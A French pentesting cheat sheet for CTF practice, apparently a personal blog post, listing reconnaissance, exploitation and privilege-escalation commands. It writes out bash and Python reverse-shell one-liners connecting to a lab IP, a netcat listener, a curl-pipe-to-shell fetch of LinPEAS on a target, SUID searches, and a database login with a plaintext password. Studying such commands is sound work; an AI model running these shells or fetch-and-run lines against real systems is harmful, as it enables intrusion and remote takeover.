
---
title: "Mémo Commandes CTF"
date: 2025-10-08
draft: false
tags: ["pentesting", "cheatsheet"]
---

## 📁 Infrastructure
```
ctf/
├── 02_challenges/
└── 03_tools/
    └── SecLists/
```

---

## 🔍 Reconnaissance

### Gobuster - Énumération de répertoires
```bash
# Recherche de dossiers et fichiers web
gobuster dir -w directory-list-2.3-small.txt -u http://url/ -x php,html,js
```
- `dir` : mode énumération de répertoires
- `-w` : wordlist à utiliser
- `-u` : URL cible
- `-x` : extensions de fichiers à tester

### Gobuster - Énumération de vhosts
```bash
# Recherche de sous-domaines virtuels
gobuster vhost -w ~/ctf/03_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
               -u http://url \
               --append-domain
```
- `vhost` : mode virtual host
- `--append-domain` : ajoute le domaine de base aux sous-domaines testés

### Nmap - Scan de ports
```bash
# Scan complet avec détection de services
nmap -A url

# Scan avancé sans ping
nmap -Pn -sV -sS -sC -O url
```
- `-A` : détection OS, version, scripts, traceroute
- `-Pn` : pas de ping (utile si firewall)
- `-sV` : détection de version des services
- `-sS` : SYN scan (furtif)
- `-sC` : scripts par défaut
- `-O` : détection de l'OS

---

## 💣 Exploitation

### Netcat - Listener
```bash
# Écoute pour reverse shell
nc -lvnp 4444
```
- `-l` : mode écoute (listen)
- `-v` : mode verbeux
- `-n` : pas de résolution DNS
- `-p` : port d'écoute

### Reverse Shell - Bash
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.115/4444 0>&1"
```
- `-i` : shell interactif
- `>&` : redirige stdout et stderr
- `0>&1` : redirige stdin vers stdout

### Reverse Shell - Python
```bash
export RHOST="10.10.14.115";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
- `pty.spawn()` : spawne un pseudo-terminal
- `os.dup2()` : duplique les descripteurs de fichiers

### Stabilisation du Shell

**Méthode Python :**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Méthode Script :**
```bash
script /dev/null -c bash
```
- `script` : enregistre une session terminal (ici vers /dev/null)

### SearchSploit - Recherche d'exploits

**Installation :**
```bash
sudo git clone https://gitlab.com/exploit-database/exploitdb.git
sudo ln -sf /home/wanako/ctf/03_tools/exploitdb/searchsploit /usr/local/bin/searchsploit
```

**Utilisation :**
```bash
searchsploit Apache 2.x
```
📖 [Guide SearchSploit](https://medium.com/@redfanatic7/discover-exploits-easily-and-quickly-with-searchsploit-4f77da58fe42)

---

## ⬆️ Escalade de Privilèges

### Recherche de fichiers par groupe
```bash
find / -group sysadm 2>/dev/null
```
- `-group` : filtre par groupe
- `2>/dev/null` : masque les erreurs

### Recherche de binaires SUID
```bash
find / -type f -perm -4000 -user root 2>/dev/null
```
- `-type f` : uniquement les fichiers
- `-perm -4000` : bit SUID activé
- `-user root` : appartenant à root

### LinPEAS - Audit automatisé

**Sur ta machine (serveur) :**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
python -m http.server 8080
```

**Sur la cible :**
```bash
curl http://10.10.14.115:8080/linpeas.sh | sh
```

---

## 🛠️ Outils Divers

### Docker
```bash
# Build une image
docker build -t docker-image .

# Run avec volume monté
docker run -it -v $(pwd):/code docker-image
```
- `-t` : nom du tag
- `-v` : monte un volume (partage de fichiers)

### Extraction TAR
```bash
tar xvf backrest_backup.tar.gz
```
- `x` : extract
- `v` : verbose
- `f` : file

### SSH Port Forwarding
```bash
ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
```
- `-L` : forward local
- `9898:127.0.0.1:9898` : port_local:ip_distant:port_distant

### Recherche de fichiers
```bash
find / -name "hibernate.cfg.xml" 2>/dev/null
```
- `-name` : recherche par nom exact

### MySQL
```bash
mysql -u roundcube -pRCDBPass2025 roundcube -e "select * from users"
```
- `-u` : username
- `-p` : password (collé sans espace)
- `-e` : exécute une commande SQL

---

## 📚 Ressources

- **SecLists** : `~/ctf/03_tools/SecLists/`
- **ExploitDB** : `~/ctf/03_tools/exploitdb/`

